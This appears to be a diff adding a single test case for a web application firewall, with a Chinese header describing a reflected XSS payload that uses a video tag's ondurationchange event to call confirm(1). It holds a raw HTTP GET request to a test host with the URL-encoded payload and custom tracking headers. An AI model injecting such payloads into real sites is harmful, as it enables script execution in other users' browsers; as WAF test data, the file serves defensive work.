@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_video标签_ondurationchange事件-06506571
+# 攻击载荷利用了HTML中的video标签和ondurationchange属性，触发confirm()函数，显示一个提示框。当持续时间改变时触发
+GET /?id=%3Cvideo%20controls%20ondurationchange=confirm%281%29%3E%3Csource%20src=validvideo.mp4%20type=video%2Fmp4%3E%3C%2Fvideo%3E&bid=hd_tag_m8mv268p HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv268p
+RM-PRO-Token: b9e22aed94cb5bb91b9589a179f20128
+RM-PRO-Time: 1742808556811
+User-Agent: curl/7.83.1
+
